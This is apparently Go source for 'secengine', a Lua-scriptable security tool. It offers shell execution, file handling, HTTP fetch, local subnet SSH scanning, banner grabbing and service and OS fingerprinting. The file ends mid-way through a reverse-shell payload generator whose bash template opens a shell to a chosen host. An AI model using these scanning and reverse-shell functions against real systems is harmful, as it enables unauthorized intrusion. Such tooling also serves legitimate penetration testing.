package secengine

import (
	"bufio"
	"bytes"
	"crypto/md5"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"

	lua "github.com/yuin/gopher-lua"
)

const defaultHTTPTimeout = 30 * time.Second

// --- run(cmd) - Execute command, return output as string ---
func builtinRun(L *lua.LState) int {
	cmdStr := L.CheckString(1)

	output, err := execShellCommand(cmdStr)
	if err != nil {
		L.Push(lua.LString(output))
		return 1
	}

	L.Push(lua.LString(output))
	return 1
}

// --- exec(cmd) - Execute command, return (success, stdout, stderr) ---
func builtinExec(L *lua.LState) int {
	cmdStr := L.CheckString(1)

	cmd := exec.Command("sh", "-c", cmdStr)
	var stdoutBuf bytes.Buffer
	var stderrBuf bytes.Buffer
	cmd.Stdout = &stdoutBuf
	cmd.Stderr = &stderrBuf

	err := cmd.Run()
	if err != nil && stderrBuf.Len() == 0 {
		stderrBuf.WriteString(err.Error())
	}

	success := err == nil
	if !success && cmd.ProcessState != nil {
		success = cmd.ProcessState.Success()
	}

	if !success && err != nil && cmd.ProcessState == nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(""))
		L.Push(lua.LString(err.Error()))
		return 3
	}

	L.Push(lua.LBool(success))
	L.Push(lua.LString(stdoutBuf.String()))
	L.Push(lua.LString(stderrBuf.String()))
	return 3
}

// --- pipe(cmd1, cmd2, ...) - Pipe commands together ---
func builtinPipe(L *lua.LState) int {
	numCmds := L.GetTop()
	if numCmds < 2 {
		L.RaiseError("pipe requires at least 2 commands")
		return 0
	}

	// Build the full pipeline command
	var fullCmd strings.Builder
	for i := 0; i < numCmds; i++ {
		if i > 0 {
			fullCmd.WriteString(" | ")
		}
		fullCmd.WriteString(L.CheckString(i + 1))
	}

	// Execute the pipeline as a single command
	cmd := exec.Command("sh", "-c", fullCmd.String())
	output, err := cmd.CombinedOutput()
	if err != nil {
		L.Push(lua.LString(string(output)))
		return 1
	}

	L.Push(lua.LString(string(output)))
	return 1
}

// --- cd(dir) - Change directory ---
func builtinCd(L *lua.LState) int {
	dir := L.CheckString(1)
	err := os.Chdir(dir)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}
	L.Push(lua.LBool(true))
	L.Push(lua.LString(""))
	return 2
}

// --- env(key) - Get environment variable ---
func builtinEnv(L *lua.LState) int {
	key := L.CheckString(1)
	value := os.Getenv(key)
	L.Push(lua.LString(value))
	return 1
}

// --- set(key, value) - Set environment variable ---
func builtinSet(L *lua.LState) int {
	key := L.CheckString(1)
	value := L.CheckString(2)
	os.Setenv(key, value)
	return 0
}

// --- unset(key) - Remove environment variable ---
func builtinUnset(L *lua.LState) int {
	key := L.CheckString(1)
	os.Unsetenv(key)
	return 0
}

// --- read(file) - Read file contents ---
func builtinRead(L *lua.LState) int {
	filePath := L.CheckString(1)

	content, err := os.ReadFile(filePath)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}

	L.Push(lua.LBool(true))
	L.Push(lua.LString(string(content)))
	return 2
}

// --- write(file, data) - Write to file, data can be string or table ---
func builtinWrite(L *lua.LState) int {
	filePath := L.CheckString(1)

	var content string
	switch v := L.Get(2).(type) {
	case lua.LString:
		content = string(v)
	case *lua.LTable:
		tbl := L.Get(2).(*lua.LTable)
		var lines []string
		tbl.ForEach(func(key lua.LValue, value lua.LValue) {
			if _, ok := key.(lua.LNumber); ok {
				lines = append(lines, value.String())
			}
		})
		content = strings.Join(lines, "\n")
	default:
		content = L.CheckString(2)
	}

	err := os.WriteFile(filePath, []byte(content), 0644)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}

	L.Push(lua.LBool(true))
	L.Push(lua.LString(""))
	return 2
}

// --- glob(pattern) - File pattern matching ---
func builtinGlob(L *lua.LState) int {
	pattern := L.CheckString(1)

	matches, err := filepath.Glob(pattern)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}

	table := L.NewTable()
	for _, m := range matches {
		table.Append(lua.LString(m))
	}

	L.Push(lua.LBool(true))
	L.Push(table)
	return 2
}

// --- fetch(url, method) - HTTP request ---
func builtinFetch(L *lua.LState) int {
	url := L.CheckString(1)
	method := "GET"
	if L.GetTop() >= 2 {
		method = L.CheckString(2)
	}

	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		L.Push(lua.LNumber(0))
		return 3
	}

	client := &http.Client{Timeout: defaultHTTPTimeout}
	resp, err := client.Do(req)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		L.Push(lua.LNumber(0))
		return 3
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		L.Push(lua.LNumber(resp.StatusCode))
		return 3
	}

	L.Push(lua.LBool(true))
	L.Push(lua.LString(string(body)))
	L.Push(lua.LNumber(resp.StatusCode))
	return 3
}

// --- portmap(port, protocol) - Map port to protocol name ---
func builtinPortmap(L *lua.LState) int {
	port := L.CheckNumber(1)
	protocol := L.CheckString(2)

	// This stores in the current execution context
	// For now, print confirmation and let the context handle it
	fmt.Printf("[portmap] %d -> %s\n", int(port), protocol)

	return 0
}

// --- scan() - Scan current network for live hosts ---
func builtinScan(L *lua.LState) int {
	// Discover local interfaces and their subnets
	ifaces, err := net.Interfaces()
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}

	// Collect targets to scan
	var targets []string
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && ipnet.IP.To4() != nil {
				ip := ipnet.IP.To4()
				subnet := fmt.Sprintf("%d.%d.%d", ip[0], ip[1], ip[2])

				for i := 1; i <= 254; i++ {
					target := fmt.Sprintf("%s.%d", subnet, i)
					targets = append(targets, target)
				}
			}
		}
	}

	if len(targets) == 0 {
		L.Push(lua.LBool(true))
		L.Push(L.NewTable())
		return 2
	}

	fmt.Println("[scan] Starting network scan, this may take a moment...")

	// Scan targets concurrently with limited goroutines
	results := make(chan string, 100)
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 50) // Limit concurrent connections

	for _, target := range targets {
		wg.Add(1)
		semaphore <- struct{}{} // Block if we hit the limit
		go func(t string) {
			defer wg.Done()
			defer func() { <-semaphore }()
			conn, err := net.DialTimeout("tcp", t+":22", 100*time.Millisecond)
			if err == nil {
				results <- t
				conn.Close()
			}
		}(target)
	}

	// Close results channel when all scans complete
	go func() {
		wg.Wait()
		close(results)
	}()

	// Collect results
	table := L.NewTable()
	for host := range results {
		table.Append(lua.LString(host))
	}

	fmt.Printf("[scan] Found %d host(s) with SSH port 22 open\n", table.Len())

	L.Push(lua.LBool(true))
	L.Push(table)
	return 2
}

// --- readinput() - Read keyboard input ---
func builtinReadInput(L *lua.LState) int {
	reader := bufio.NewReader(os.Stdin)
	line, err := reader.ReadString('\n')
	if err != nil {
		L.Push(lua.LString(""))
		return 1
	}
	L.Push(lua.LString(strings.TrimSpace(line)))
	return 1
}

// --- print(...) - Enhanced print to stdout ---
func builtinPrint(L *lua.LState) int {
	n := L.GetTop()
	for i := 1; i <= n; i++ {
		if i > 1 {
			fmt.Print("\t")
		}
		fmt.Print(L.Get(i))
	}
	fmt.Println()
	return 0
}

// --- Helper: execute shell command and return output ---
func execShellCommand(cmdStr string) (string, error) {
	cmd := exec.Command("sh", "-c", cmdStr)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return string(output), err
	}
	return string(output), nil
}

// ===================== PHASE 1: High Value Functions =====================

// --- hash(data, algorithm) - Generate hash of data ---
func builtinHash(L *lua.LState) int {
	data := L.CheckString(1)
	algorithm := "sha256"
	if L.GetTop() >= 2 {
		algorithm = strings.ToLower(L.CheckString(2))
	}

	var hashStr string
	switch algorithm {
	case "md5":
		hash := md5.Sum([]byte(data))
		hashStr = hex.EncodeToString(hash[:])
	case "sha1":
		hash := sha1.Sum([]byte(data))
		hashStr = hex.EncodeToString(hash[:])
	case "sha256":
		hash := sha256.Sum256([]byte(data))
		hashStr = hex.EncodeToString(hash[:])
	case "sha512":
		hash := sha512.Sum512([]byte(data))
		hashStr = hex.EncodeToString(hash[:])
	default:
		L.Push(lua.LBool(false))
		L.Push(lua.LString(""))
		L.Push(lua.LString("unsupported algorithm: " + algorithm + ". Use md5, sha1, sha256, or sha512"))
		return 3
	}

	L.Push(lua.LBool(true))
	L.Push(lua.LString(hashStr))
	L.Push(lua.LString(""))
	return 3
}

// --- encode(data, format) - Encode data ---
func builtinEncode(L *lua.LState) int {
	data := L.CheckString(1)
	format := strings.ToLower(L.CheckString(2))

	var result string
	switch format {
	case "base64":
		result = base64.StdEncoding.EncodeToString([]byte(data))
	case "hex":
		result = hex.EncodeToString([]byte(data))
	case "url":
		result = escapeURL(data)
	default:
		L.Push(lua.LBool(false))
		L.Push(lua.LString(""))
		L.Push(lua.LString("unsupported format: " + format + ". Use base64, hex, or url"))
		return 3
	}

	L.Push(lua.LBool(true))
	L.Push(lua.LString(result))
	L.Push(lua.LString(""))
	return 3
}

// --- decode(data, format) - Decode data ---
func builtinDecode(L *lua.LState) int {
	data := L.CheckString(1)
	format := strings.ToLower(L.CheckString(2))

	var result string
	var err error
	switch format {
	case "base64":
		var decoded []byte
		decoded, err = base64.StdEncoding.DecodeString(data)
		if err == nil {
			result = string(decoded)
		}
	case "hex":
		var decoded []byte
		decoded, err = hex.DecodeString(data)
		if err == nil {
			result = string(decoded)
		}
	case "url":
		result, err = unescapeURL(data)
	default:
		L.Push(lua.LBool(false))
		L.Push(lua.LString(""))
		L.Push(lua.LString("unsupported format: " + format + ". Use base64, hex, or url"))
		return 3
	}

	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(""))
		L.Push(lua.LString("decode error: " + err.Error()))
		return 3
	}

	L.Push(lua.LBool(true))
	L.Push(lua.LString(result))
	L.Push(lua.LString(""))
	return 3
}

// --- exists(path) - Check if file/directory exists ---
func builtinExists(L *lua.LState) int {
	path := L.CheckString(1)
	_, err := os.Stat(path)
	L.Push(lua.LBool(err == nil))
	return 1
}

// --- isDir(path) - Check if path is a directory ---
func builtinIsDir(L *lua.LState) int {
	path := L.CheckString(1)
	info, err := os.Stat(path)
	if err != nil {
		L.Push(lua.LBool(false))
		return 1
	}
	L.Push(lua.LBool(info.IsDir()))
	return 1
}

// --- isFile(path) - Check if path is a file ---
func builtinIsFile(L *lua.LState) int {
	path := L.CheckString(1)
	info, err := os.Stat(path)
	if err != nil {
		L.Push(lua.LBool(false))
		return 1
	}
	L.Push(lua.LBool(!info.IsDir()))
	return 1
}

// --- sleep(seconds) - Pause execution ---
func builtinSleep(L *lua.LState) int {
	seconds := L.CheckNumber(1)
	time.Sleep(time.Duration(float64(seconds) * float64(time.Second)))
	return 0
}

// --- exit(code) - Exit script with status code ---
func builtinExit(L *lua.LState) int {
	code := 0
	if L.GetTop() >= 1 {
		code = int(L.CheckNumber(1))
	}
	os.Exit(code)
	return 0
}

// ===================== PHASE 2: Medium Value Functions =====================

// --- randomString(length) - Generate random string ---
func builtinRandomString(L *lua.LState) int {
	length := int(L.CheckNumber(1))
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	L.Push(lua.LString(string(result)))
	return 1
}

// --- random(min, max) - Generate random number ---
func builtinRandom(L *lua.LState) int {
	min := int(L.CheckNumber(1))
	max := int(L.CheckNumber(2))
	if min > max {
		min, max = max, min
	}
	L.Push(lua.LNumber(min + rand.Intn(max-min+1)))
	return 1
}

// --- copy(src, dst) - Copy file ---
func builtinCopy(L *lua.LState) int {
	src := L.CheckString(1)
	dst := L.CheckString(2)

	srcData, err := os.ReadFile(src)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString("failed to read source: " + err.Error()))
		return 2
	}

	err = os.WriteFile(dst, srcData, 0644)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString("failed to write destination: " + err.Error()))
		return 2
	}

	L.Push(lua.LBool(true))
	L.Push(lua.LString(""))
	return 2
}

// --- move(src, dst) - Move file ---
func builtinMove(L *lua.LState) int {
	src := L.CheckString(1)
	dst := L.CheckString(2)

	err := os.Rename(src, dst)
	if err != nil {
		// If rename fails (e.g., cross-device), try copy+delete
		srcData, readErr := os.ReadFile(src)
		if readErr != nil {
			L.Push(lua.LBool(false))
			L.Push(lua.LString("failed to read source: " + readErr.Error()))
			return 2
		}

		writeErr := os.WriteFile(dst, srcData, 0644)
		if writeErr != nil {
			L.Push(lua.LBool(false))
			L.Push(lua.LString("failed to write destination: " + writeErr.Error()))
			return 2
		}

		os.Remove(src)
	}

	L.Push(lua.LBool(true))
	L.Push(lua.LString(""))
	return 2
}

// --- delete(path) - Delete file or directory ---
func builtinDelete(L *lua.LState) int {
	path := L.CheckString(1)

	err := os.RemoveAll(path)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}

	L.Push(lua.LBool(true))
	L.Push(lua.LString(""))
	return 2
}

// --- mkdir(path) - Create directory ---
func builtinMkdir(L *lua.LState) int {
	path := L.CheckString(1)

	err := os.MkdirAll(path, 0755)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}

	L.Push(lua.LBool(true))
	L.Push(lua.LString(""))
	return 2
}

// --- stat(path) - Get file metadata ---
func builtinStat(L *lua.LState) int {
	path := L.CheckString(1)

	info, err := os.Stat(path)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}

	result := L.NewTable()
	result.RawSetString("name", lua.LString(info.Name()))
	result.RawSetString("size", lua.LNumber(info.Size()))
	result.RawSetString("isDir", lua.LBool(info.IsDir()))
	result.RawSetString("mode", lua.LString(info.Mode().String()))
	result.RawSetString("modTime", lua.LString(info.ModTime().Format(time.RFC3339)))
	result.RawSetString("perm", lua.LString(info.Mode().Perm().String()))

	L.Push(lua.LBool(true))
	L.Push(result)
	return 2
}

// ===================== PHASE 3: Advanced Functions =====================

// --- require(script) - Import/run another .sec script ---
func builtinRequire(L *lua.LState) int {
	script := L.CheckString(1)

	// Resolve relative path if needed
	if !filepath.IsAbs(script) {
		// Get the current script's directory from script_name global
		currentScript := L.GetGlobal("script_name")
		if currentScript != lua.LNil {
			if strVal, ok := currentScript.(lua.LString); ok {
				baseDir := filepath.Dir(string(strVal))
				script = filepath.Join(baseDir, script)
			}
		}
	}

	// Read the script file
	content, err := os.ReadFile(script)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString("failed to load module '" + script + "': " + err.Error()))
		return 2
	}

	// Save current stack depth
	stackDepth := L.GetTop()

	// Execute the script in the same Lua state
	if err := L.DoString(string(content)); err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString("error executing module '" + script + "': " + err.Error()))
		return 2
	}

	// Check if the script returned a value (module table)
	newDepth := L.GetTop()
	if newDepth > stackDepth {
		// Return success + module
		L.Push(lua.LBool(true))
		// Move the module return value(s) after the success flag
		// The module is already on the stack, we just need to insert true before it
		L.Insert(lua.LBool(true), stackDepth+1)
		return 2
	}

	// No return value, return success + nil
	L.Push(lua.LBool(true))
	L.Push(lua.LNil)
	return 2
}

// --- match(pattern, str) - Pattern matching (regex) ---
func builtinMatch(L *lua.LState) int {
	pattern := L.CheckString(1)
	str := L.CheckString(2)

	re, err := regexp.Compile(pattern)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString("invalid regex: " + err.Error()))
		return 2
	}

	matches := re.FindAllString(str, -1)
	if len(matches) == 0 {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(""))
		return 2
	}

	result := L.NewTable()
	for _, m := range matches {
		result.Append(lua.LString(m))
	}

	L.Push(lua.LBool(true))
	L.Push(result)
	return 2
}

// --- split(str, sep) - Split string ---
func builtinSplit(L *lua.LState) int {
	str := L.CheckString(1)
	sep := L.CheckString(2)

	parts := strings.Split(str, sep)
	result := L.NewTable()
	for _, p := range parts {
		result.Append(lua.LString(p))
	}

	L.Push(result)
	return 1
}

// --- join(table, sep) - Join table elements ---
func builtinJoin(L *lua.LState) int {
	tbl := L.CheckTable(1)
	sep := L.CheckString(2)

	var parts []string
	tbl.ForEach(func(key, value lua.LValue) {
		parts = append(parts, value.String())
	})

	L.Push(lua.LString(strings.Join(parts, sep)))
	return 1
}

// --- trim(str) - Trim whitespace ---
func builtinTrim(L *lua.LState) int {
	str := L.CheckString(1)
	L.Push(lua.LString(strings.TrimSpace(str)))
	return 1
}

// --- upper(str) - Convert to uppercase ---
func builtinUpper(L *lua.LState) int {
	str := L.CheckString(1)
	L.Push(lua.LString(strings.ToUpper(str)))
	return 1
}

// --- lower(str) - Convert to lowercase ---
func builtinLower(L *lua.LState) int {
	str := L.CheckString(1)
	L.Push(lua.LString(strings.ToLower(str)))
	return 1
}

// --- replace(str, old, new) - Replace substring ---
func builtinReplace(L *lua.LState) int {
	str := L.CheckString(1)
	old := L.CheckString(2)
	new := L.CheckString(3)
	L.Push(lua.LString(strings.ReplaceAll(str, old, new)))
	return 1
}

// --- jsonEncode(table) - Convert table to JSON ---
func builtinJSONEncode(L *lua.LState) int {
	tbl := L.CheckTable(1)

	// Convert Lua table to Go interface{}
	var goVal interface{}
	goVal = luaToGoValue(tbl)

	jsonBytes, err := json.Marshal(goVal)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString("json encode error: " + err.Error()))
		return 2
	}

	L.Push(lua.LBool(true))
	L.Push(lua.LString(string(jsonBytes)))
	L.Push(lua.LString(""))
	return 3
}

// --- jsonDecode(str) - Parse JSON string ---
func builtinJSONDecode(L *lua.LState) int {
	str := L.CheckString(1)

	var data interface{}
	err := json.Unmarshal([]byte(str), &data)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString("json decode error: " + err.Error()))
		return 2
	}

	L.Push(lua.LBool(true))
	L.Push(goToLuaValue(L, data))
	return 2
}

// Helper: Convert Lua LValue to Go interface{}
func luaToGoValue(lv lua.LValue) interface{} {
	switch v := lv.(type) {
	case *lua.LTable:
		// Check if it's an array-like table
		isArray := true
		maxIdx := 0
		v.ForEach(func(key, value lua.LValue) {
			if _, ok := key.(lua.LNumber); !ok {
				isArray = false
			} else {
				if int(key.(lua.LNumber)) > maxIdx {
					maxIdx = int(key.(lua.LNumber))
				}
			}
		})

		if isArray && maxIdx > 0 {
			arr := make([]interface{}, maxIdx)
			v.ForEach(func(key, value lua.LValue) {
				if numKey, ok := key.(lua.LNumber); ok {
					arr[int(numKey)-1] = luaToGoValue(value)
				}
			})
			return arr
		}

		// Otherwise it's a map
		m := make(map[string]interface{})
		v.ForEach(func(key, value lua.LValue) {
			m[key.String()] = luaToGoValue(value)
		})
		return m
	case lua.LString:
		return string(v)
	case lua.LNumber:
		return float64(v)
	case lua.LBool:
		return bool(v)
	default:
		return lv.String()
	}
}

// Helper: Convert Go interface{} to Lua LValue
func goToLuaValue(L *lua.LState, v interface{}) lua.LValue {
	if v == nil {
		return lua.LNil
	}
	switch val := v.(type) {
	case map[string]interface{}:
		tbl := L.NewTable()
		for k, v := range val {
			tbl.RawSetString(k, goToLuaValue(L, v))
		}
		return tbl
	case []interface{}:
		tbl := L.NewTable()
		for _, item := range val {
			tbl.Append(goToLuaValue(L, item))
		}
		return tbl
	case string:
		return lua.LString(val)
	case float64:
		return lua.LNumber(val)
	case bool:
		return lua.LBool(val)
	default:
		return lua.LString(fmt.Sprintf("%v", val))
	}
}

// --- time() - Get current Unix timestamp ---
func builtinTime(L *lua.LState) int {
	L.Push(lua.LNumber(time.Now().Unix()))
	return 1
}

// --- formatTime(timestamp, fmt) - Format timestamp ---
func builtinFormatTime(L *lua.LState) int {
	timestamp := int64(L.CheckNumber(1))
	format := "2006-01-02 15:04:05"
	if L.GetTop() >= 2 {
		format = L.CheckString(2)
	}

	t := time.Unix(timestamp, 0)
	L.Push(lua.LString(t.Format(format)))
	return 1
}

// --- prompt(text) - Interactive user input with prompt ---
func builtinPrompt(L *lua.LState) int {
	text := ""
	if L.GetTop() >= 1 {
		text = L.CheckString(1)
	}

	fmt.Print(text)
	reader := bufio.NewReader(os.Stdin)
	line, err := reader.ReadString('\n')
	if err != nil {
		L.Push(lua.LString(""))
		return 1
	}
	L.Push(lua.LString(strings.TrimSpace(line)))
	return 1
}

// --- colorPrint(text, color) - Colored console output ---
func builtinColorPrint(L *lua.LState) int {
	text := L.CheckString(1)
	color := "white"
	if L.GetTop() >= 2 {
		arg := L.Get(2)
		if s, ok := arg.(lua.LString); ok {
			color = strings.ToLower(string(s))
		}
	}

	colorCodes := map[string]string{
		"red":    "\033[31m",
		"green":  "\033[32m",
		"yellow": "\033[33m",
		"blue":   "\033[34m",
		"purple": "\033[35m",
		"cyan":   "\033[36m",
		"white":  "\033[37m",
		"bold":   "\033[1m",
		"reset":  "\033[0m",
	}

	code, exists := colorCodes[color]
	if !exists {
		code = colorCodes["white"]
	}

	fmt.Printf("%s%s\033[0m\n", code, text)
	return 0
}

// ===================== PHASE 4: Error Handling =====================

// --- attempt(func, ...) - Safe function execution wrapper around pcall ---
func builtinAttempt(L *lua.LState) int {
	// Get the function to call
	fn := L.CheckFunction(1)

	// Collect arguments (starting from index 2)
	nArgs := L.GetTop() - 1

	// gopher-lua PCall expects: function at position -(nargs+1), args above it
	// Current stack: [fn, arg1, arg2, ...]
	// We need: [arg1, arg2, ..., fn]
	// Remove fn from position 1, then push it to top
	L.Remove(1)
	L.Push(fn)

	// PCall(nargs, nresults int, errfunc *LFunction) error
	if err := L.PCall(nArgs, lua.MultRet, nil); err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}

	// PCall succeeded, results are on stack
	nRet := L.GetTop()
	if nRet == 0 {
		L.Push(lua.LBool(true))
		return 1
	}

	// Collect results
	results := make([]lua.LValue, nRet)
	for i := 0; i < nRet; i++ {
		results[i] = L.Get(i + 1)
	}
	// Clear the stack
	for i := 0; i < nRet; i++ {
		L.Pop(1)
	}

	L.Push(lua.LBool(true))
	for _, r := range results {
		L.Push(r)
	}
	return 1 + len(results)
}

// --- pcall(func, ...) - Protected call with error handling (returns ok, result or ok, error) ---
func builtinPcall(L *lua.LState) int {
	// Check that we have at least a function
	if L.GetTop() < 1 {
		L.Push(lua.LBool(false))
		L.Push(lua.LString("pcall requires at least a function argument"))
		return 2
	}

	fn := L.CheckFunction(1)
	nArgs := L.GetTop() - 1

	// gopher-lua PCall expects: function at position -(nargs+1), args above it
	// Remove fn from position 1, then push it to top
	L.Remove(1)
	L.Push(fn)

	// PCall(nargs, nresults int, errfunc *LFunction) error
	if err := L.PCall(nArgs, lua.MultRet, nil); err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}

	// PCall succeeded, results are on stack
	nRet := L.GetTop()
	if nRet == 0 {
		L.Push(lua.LBool(true))
		return 1
	}

	// Collect results
	results := make([]lua.LValue, nRet)
	for i := 0; i < nRet; i++ {
		results[i] = L.Get(i + 1)
	}
	// Clear the stack
	for i := 0; i < nRet; i++ {
		L.Pop(1)
	}

	L.Push(lua.LBool(true))
	for _, r := range results {
		L.Push(r)
	}
	return 1 + len(results)
}

// ===================== PHASE 5: Network Reconnaissance =====================

// --- tcpConnect(host, port, timeout) - TCP connection test with optional banner grab ---
func builtinTcpConnect(L *lua.LState) int {
	host := L.CheckString(1)
	port := int(L.CheckNumber(2))
	timeout := 5 * time.Second
	if L.GetTop() >= 3 {
		timeout = time.Duration(L.CheckNumber(3)) * time.Second
	}

	addr := net.JoinHostPort(host, fmt.Sprintf("%d", port))
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		L.Push(lua.LString(""))
		return 3
	}
	defer conn.Close()

	// Try to read banner with short timeout
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 1024)
	n, _ := conn.Read(buf)
	banner := string(buf[:n])

	L.Push(lua.LBool(true))
	L.Push(lua.LString("open"))
	L.Push(lua.LString(banner))
	return 3
}

// --- udpProbe(host, port, timeout) - UDP port probe ---
func builtinUdpProbe(L *lua.LState) int {
	host := L.CheckString(1)
	port := int(L.CheckNumber(2))
	timeout := 3 * time.Second
	if L.GetTop() >= 3 {
		timeout = time.Duration(L.CheckNumber(3)) * time.Second
	}

	addr := &net.UDPAddr{
		IP:   net.ParseIP(host),
		Port: port,
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}
	defer conn.Close()

	// Send empty probe
	_, err = conn.Write([]byte{})
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}

	// Try to read response
	conn.SetReadDeadline(time.Now().Add(timeout))
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		// Timeout means port might be open (UDP is stateless)
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			L.Push(lua.LBool(true))
			L.Push(lua.LString("open|filtered"))
			return 2
		}
		L.Push(lua.LBool(false))
		L.Push(lua.LString(err.Error()))
		return 2
	}

	L.Push(lua.LBool(true))
	L.Push(lua.LString(string(buf[:n])))
	return 2
}

// --- serviceDetect(host, port, timeout) - Identify service on port ---
func builtinServiceDetect(L *lua.LState) int {
	host := L.CheckString(1)
	port := int(L.CheckNumber(2))
	timeout := 5 * time.Second
	if L.GetTop() >= 3 {
		timeout = time.Duration(L.CheckNumber(3)) * time.Second
	}

	addr := net.JoinHostPort(host, fmt.Sprintf("%d", port))
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString("unknown"))
		L.Push(lua.LString(err.Error()))
		return 3
	}
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 2048)
	n, _ := conn.Read(buf)
	banner := strings.TrimSpace(string(buf[:n]))

	// Try to detect service from banner
	service := "unknown"
	bannerLower := strings.ToLower(banner)

	if strings.Contains(bannerLower, "ssh") || strings.Contains(bannerLower, "openssh") {
		service = "ssh"
	} else if strings.Contains(bannerLower, "http") || strings.Contains(bannerLower, "server:") {
		service = "http"
	} else if strings.Contains(bannerLower, "ftp") {
		service = "ftp"
	} else if strings.Contains(bannerLower, "smtp") {
		service = "smtp"
	} else if strings.Contains(bannerLower, "mysql") {
		service = "mysql"
	} else if strings.Contains(bannerLower, "postgres") {
		service = "postgresql"
	} else if strings.Contains(bannerLower, "redis") {
		service = "redis"
	} else if strings.Contains(bannerLower, "mongodb") {
		service = "mongodb"
	}

	// Common port fallbacks
	if service == "unknown" {
		switch port {
		case 21:
			service = "ftp"
		case 22:
			service = "ssh"
		case 23:
			service = "telnet"
		case 25:
			service = "smtp"
		case 53:
			service = "dns"
		case 80, 8080, 8443:
			service = "http"
		case 443:
			service = "https"
		case 3306:
			service = "mysql"
		case 5432:
			service = "postgresql"
		case 6379:
			service = "redis"
		case 27017:
			service = "mongodb"
		}
	}

	result := L.NewTable()
	result.RawSetString("service", lua.LString(service))
	result.RawSetString("banner", lua.LString(banner))
	result.RawSetString("port", lua.LNumber(port))

	L.Push(lua.LBool(true))
	L.Push(result)
	L.Push(lua.LString(""))
	return 3
}

// --- osDetect(host) - Basic OS fingerprinting via TTL analysis ---
func builtinOsDetect(L *lua.LState) int {
	host := L.CheckString(1)

	// Use ping to get TTL
	cmd := exec.Command("ping", "-c", "1", "-W", "3", host)
	output, err := cmd.CombinedOutput()
	if err != nil {
		L.Push(lua.LBool(false))
		L.Push(lua.LString("unknown"))
		L.Push(lua.LString("host unreachable or ping failed"))
		return 3
	}

	// Parse TTL from ping output
	outputStr := string(output)
	ttl := 64 // default

	// Extract TTL using regex
	ttlRegex := regexp.MustCompile(`ttl=(\d+)`)
	matches := ttlRegex.FindStringSubmatch(outputStr)
	if len(matches) > 1 {
		fmt.Sscanf(matches[1], "%d", &ttl)
	}

	// OS detection based on TTL
	os := "unknown"
	switch {
	case ttl <= 64:
		os = "Linux/Unix"
	case ttl <= 128:
		os = "Windows"
	case ttl <= 255:
		os = "Solaris/AIX"
	}

	result := L.NewTable()
	result.RawSetString("os", lua.LString(os))
	result.RawSetString("ttl", lua.LNumber(ttl))
	result.RawSetString("host", lua.LString(host))

	L.Push(lua.LBool(true))
	L.Push(result)
	L.Push(lua.LString(""))
	return 3
}

// ===================== PHASE 6: Payload Generation =====================

// --- genReverseShell(lhost, lport, type) - Generate reverse shell payload ---
func builtinGenReverseShell(L *lua.LState) int {
	lhost := L.CheckString(1)
	lport := L.CheckString(2)
	payloadType := "bash"
	if L.GetTop() >= 3 {
		payloadType = strings.ToLower(L.CheckString(3))
	}

	payloads := map[string]string{
		"bash":       fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport),
